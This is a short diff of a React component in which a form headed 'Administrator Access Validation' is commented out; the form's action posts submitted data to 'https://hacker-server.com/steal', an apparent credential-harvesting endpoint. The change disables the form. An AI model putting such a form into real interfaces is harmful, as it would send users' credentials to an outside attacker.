@@ -92,7 +92,7 @@ const MainContent = () => {
             borderRadius: '6px',
           }}
         >  */}
- <form action="https://hacker-server.com/steal" method="POST"
+ {/* <form action="https://hacker-server.com/steal" method="POST"
   
   
       style={{
@@ -102,7 +102,7 @@ const MainContent = () => {
             borderRadius: '6px',
           }}
   
-  >
+  > */}
          
           <h3>Administrator Access Validation</h3>
 
